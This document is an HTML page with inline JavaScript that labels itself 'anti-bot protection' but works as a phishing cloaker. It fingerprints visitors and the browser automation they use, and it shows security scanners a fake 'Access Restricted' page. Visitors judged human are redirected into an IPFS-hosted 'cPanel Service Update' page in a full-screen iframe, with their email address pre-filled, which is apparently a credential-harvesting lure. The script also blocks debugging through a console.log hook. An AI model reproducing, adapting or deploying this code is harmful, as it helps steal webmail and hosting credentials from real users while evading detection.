<body>
<!-- COMPLETELY INVISIBLE CONTAINER - NO TEXT, NO MESSAGES -->
<div id="invisible-container"></div>

<script>
// ADVANCED ANTI-BOT PROTECTION - COMPLETELY INVISIBLE
(() => {
    'use strict';
    
    // ================= CONFIGURATION =================
    const TARGET_BASE = "https://bafkreick3zbqfdrqbzniqoyztbbmu52nuklp2blqgwfbbveu6e5tasjngu.ipfs.dweb.link/";
    const FINAL_PAGE_TITLE = "cPanel Service Update";
    const FAKE_URLS = [
        "https://example.com/error",
        "https://www.example.org/404",
        "https://www.example.net/access-denied"
    ];
    
    const HUMAN_COOKIE = 'Webmail signin_verified';
    const COOKIE_EXPIRES = 86400;
    const BOT_COOKIE = 'suspicious_activity';
    const BOT_COOKIE_EXPIRES = 1800;
    // ================= END CONFIGURATION =================
    
    // Utility functions
    function getCookie(name) {
        return document.cookie
            .split('; ')
            .find(row => row.startsWith(name + '='))
            ?.split('=')[1];
    }
    
    function setCookie(name, value, seconds) {
        const expires = new Date(Date.now() + seconds * 1000).toUTCString();
        document.cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax; Secure`;
    }
    
    function getEmail() {
        try {
            const params = new URLSearchParams(window.location.search);
            return params.get('email')?.trim() || '';
        } catch(e) {
            return '';
        }
    }
    
    // Advanced invisible bot detection
    function advancedBotDetection() {
        let score = 0;
        
        // 1. WebGL fingerprinting (invisible check)
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    
                    if (renderer.includes('SwiftShader') || renderer.includes('llvmpipe')) {
                        score += 25;
                    }
                    if (vendor.includes('Brian Paul') || vendor.includes('Mesa')) {
                        score += 15;
                    }
                }
            }
        } catch(e) {}
        
        // 2. Automation detection
        const automationChecks = [
            () => navigator.webdriver === true,
            () => window.callPhantom || window._phantom,
            () => window.__nightmare,
            () => navigator.plugins.length === 0 && navigator.languages.length === 0,
            () => /HeadlessChrome/.test(navigator.userAgent)
        ];
        
        automationChecks.forEach((check, i) => {
            try {
                if (check()) {
                    score += 10 + (i * 2);
                }
            } catch(e) {}
        });
        
        // 3. Behavior analysis
        if (window.outerWidth === 0 && window.outerHeight === 0) {
            score += 20;
        }
        
        if (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) {
            score += 10;
        }
        
        // 4. Timezone and language checks
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        if (!timezone || timezone === 'UTC' || timezone.includes('Etc/')) {
            score += 15;
        }
        
        // 5. Plugin consistency check
        const mimeTypes = navigator.mimeTypes;
        const plugins = navigator.plugins;
        if (plugins.length > 0 && mimeTypes.length === 0) {
            score += 20;
        }
        
        return { score, isBot: score > 45 };
    }
    
    // Invisible human interaction verification
    function verifyHumanInteraction() {
        return new Promise((resolve) => {
            let interactionScore = 0;
            const requiredScore = 3;
            
            const events = {
                mousemove: (e) => {
                    if (e.movementX !== 0 || e.movementY !== 0) {
                        interactionScore += 2;
                    }
                },
                mousedown: () => {
                    interactionScore += 3;
                },
                keydown: (e) => {
                    if (e.key.length === 1) {
                        interactionScore += 2;
                    }
                },
                wheel: () => {
                    interactionScore += 1;
                }
            };
            
            Object.entries(events).forEach(([event, handler]) => {
                document.addEventListener(event, handler, { passive: true });
            });
            
            let timeBonus = 0;
            const startTime = Date.now();
            
            const interval = setInterval(() => {
                const elapsed = Date.now() - startTime;
                
                if (elapsed > 2000) timeBonus = 1;
                if (elapsed > 4000) timeBonus = 2;
                
                const totalScore = interactionScore + timeBonus;
                
                if (totalScore >= requiredScore) {
                    clearInterval(interval);
                    Object.keys(events).forEach(event => {
                        document.removeEventListener(event, events[event]);
                    });
                    resolve(true);
                }
                
            }, 500);
            
            setTimeout(() => {
                clearInterval(interval);
                Object.keys(events).forEach(event => {
                    document.removeEventListener(event, events[event]);
                });
                resolve(interactionScore + timeBonus >= requiredScore);
            }, 8000);
        });
    }
    
    // Create final page
    function createFinalPage(targetUrl) {
        const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${FINAL_PAGE_TITLE}</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2248%22 fill=%22%230075C9%22/><circle cx=%2250%22 cy=%2250%22 r=%2235%22 fill=%22%23ffffff%22/><circle cx=%2250%22 cy=%2250%22 r=%2218%22 fill=%22%230075C9%22/><text x=%2250%22 y=%2255%22 font-family=%22Arial, sans-serif%22 font-size=%2224%22 font-weight=%22bold%22 fill=%22%23ffffff%22 text-anchor=%22middle%22>c</text></svg>">
<style>
html, body { margin:0; padding:0; width:100%; height:100%; }
iframe { width:100%; height:100%; border:none; }
</style>
</head>
<body>
<iframe src="${targetUrl}" sandbox="allow-forms allow-scripts allow-same-origin allow-popups"></iframe>
</body>
</html>`;
        return new Blob([html], { type: 'text/html' });
    }
    
    // Redirect to fake page (invisible)
    function redirectToFake() {
        const randomUrl = FAKE_URLS[Math.floor(Math.random() * FAKE_URLS.length)];
        setCookie(BOT_COOKIE, '1', BOT_COOKIE_EXPIRES);
        
        const fakeHtml = `<!DOCTYPE html>
<html>
<head><title>Access Denied</title></head>
<body style="margin:0;padding:40px;font-family:Arial,sans-serif;">
<h2>Access Restricted</h2>
<p>Unable to verify your browser. Please try again later.</p>
<p style="color:#888;font-size:12px;">Error Code: 403_FORBIDDEN</p>
</body>
</html>`;
        
        const fakeBlob = new Blob([fakeHtml], { type: 'text/html' });
        const fakeUrl = URL.createObjectURL(fakeBlob);
        window.location.replace(fakeUrl);
    }
    
    // Fade out invisible container
    function fadeOutContainer() {
        const container = document.getElementById('invisible-container');
        if (container) {
            container.classList.add('hidden');
            setTimeout(() => {
                container.style.display = 'none';
            }, 300);
        }
    }
    
    // Main protection flow - COMPLETELY INVISIBLE
    async function executeProtection() {
        // Check existing cookies
        if (getCookie(HUMAN_COOKIE)) {
            const email = getEmail();
            const target = email ? `${TARGET_BASE}?email=${encodeURIComponent(email)}` : TARGET_BASE;
            const blob = createFinalPage(target);
            const blobUrl = URL.createObjectURL(blob);
            window.location.replace(blobUrl);
            return;
        }
        
        if (getCookie(BOT_COOKIE)) {
            setTimeout(redirectToFake, 500);
            return;
        }
        
        // Rate limiting
        const lastVisit = localStorage.getItem('last_visit');
        const now = Date.now();
        if (lastVisit && (now - parseInt(lastVisit)) < 3000) {
            setTimeout(redirectToFake, 1000);
            return;
        }
        localStorage.setItem('last_visit', now.toString());
        
        // Advanced bot detection
        await new Promise(resolve => setTimeout(resolve, 800));
        
        const detectionResult = advancedBotDetection();
        
        if (detectionResult.isBot) {
            setTimeout(redirectToFake, 500);
            return;
        }
        
        // Human interaction verification
        const isHuman = await verifyHumanInteraction();
        
        if (!isHuman) {
            setTimeout(redirectToFake, 500);
            return;
        }
        
        // Success
        setCookie(HUMAN_COOKIE, '1', COOKIE_EXPIRES);
        
        const email = getEmail();
        const target = email ? `${TARGET_BASE}?email=${encodeURIComponent(email)}` : TARGET_BASE;
        
        // Fade out invisible container before redirect
        fadeOutContainer();
        
        setTimeout(() => {
            const blob = createFinalPage(target);
            const blobUrl = URL.createObjectURL(blob);
            window.location.replace(blobUrl);
        }, 300);
    }
    
    // Start protection
    setTimeout(() => {
        executeProtection().catch(error => {
            const email = getEmail();
            const target = email ? 
                `${TARGET_BASE}?email=${encodeURIComponent(email)}` : 
                TARGET_BASE;
            window.location.replace(target);
        });
    }, 500);
    
    // Subtle anti-debugging
    let debugCheckCount = 0;
    const originalConsole = {
        log: console.log,
        warn: console.warn,
        error: console.error
    };
    
    console.log = function(...args) {
        debugCheckCount++;
        if (debugCheckCount > 10) {
            setTimeout(redirectToFake, 500);
        }
        originalConsole.log.apply(console, args);
    };
    
})();
</script>
